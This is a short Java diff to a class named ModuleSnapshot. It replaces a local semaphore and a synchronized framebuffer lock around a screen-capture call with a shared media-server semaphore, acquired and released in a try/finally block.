@@ -132,11 +132,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 			return;
 		}
-		if (!working.tryAcquire()) {
-			return;
-		}
 
-		synchronized(Status.self().lockFramebuffer) {
+		if (Status.self().semaphoreMediaserver.tryAcquire()) {
+
 			try {
 				if (!screencapMethod()) {
 					screenCap = false;
@@ -161,7 +159,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					Check.log(ex);//$NON-NLS-1$
 				}
 			} finally {
-				working.release();
+				Status.self().semaphoreMediaserver.release();
 			}
 		}
 
